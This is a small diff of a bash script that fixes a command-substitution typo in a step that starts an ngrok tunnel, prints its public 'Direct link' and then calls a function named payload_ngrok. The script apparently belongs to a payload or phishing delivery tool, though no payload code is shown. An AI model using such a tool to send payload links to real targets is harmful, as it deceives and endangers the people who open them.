@@ -187,7 +187,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | ./jq -r ' .tunnels[0].public_url ' > link.txt)
-send_link=$ (cat link.txt)
+send_link=$(cat link.txt)
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $send_link
 
 payload_ngrok
